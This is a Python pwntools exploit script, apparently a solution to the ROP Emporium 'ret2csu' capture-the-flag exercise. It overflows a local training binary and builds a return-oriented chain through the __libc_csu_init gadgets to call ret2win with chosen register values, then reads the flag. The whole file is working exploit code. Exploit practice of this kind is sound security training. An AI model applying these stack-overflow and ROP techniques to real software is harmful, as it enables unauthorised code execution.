from pwn import *
import warnings

warnings.filterwarnings('ignore', category=BytesWarning)

# file information here

context.arch = 'x86_64'
executable = 'ret2csu'
gdbinit = '''
    b *pwnme+0x98
    c
'''

elf = ELF(executable)
libc = elf.libc
rop = ROP([elf, libc])

p = process(elf.path)
# gdb.attach(p, gdbscript=gdbinit)

p.recvuntil("")

# THE ROP CHAIN

ret2win = 0x400510
r12 = 0x400000
rbx = 0xa2 # which is (ret2win - r12) / 8 - because of the csu call gadget
r13_rdi = 0xdeadbeefdeadbeef
r14_rsi = 0xcafebabecafebabe
r15_rdx = 0xd00df00dd00df00d
csuGadget_0 = 0x40069a
csuGadget_1 = 0x400680
pop_rdi = 0x00000000004006a3
finiPtr = 0x600e48

rop.call(csuGadget_0) # libc_csu pop gadget
rop.raw(3)
rop.raw(4)
rop.raw(0x600e48 - 3*8)  # call dword [r12+rbx*8]
rop.raw(r13_rdi)
rop.raw(r14_rsi)
rop.raw(r15_rdx)
rop.raw(csuGadget_1)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(pop_rdi)
rop.raw(r13_rdi)
rop.call(ret2win)

info(rop.dump())

payload = flat(
    b'a' * 0x28, # padding
    rop.chain()    
)

# PWN
# pause()
# p.sendlineafter()
# p.recvuntil()

p.sendlineafter('> ', payload)

flag = p.recvline_contains('ROPE')
success(flag)

# with open('out.txt', 'wb') as out:
    # out.write(payload)
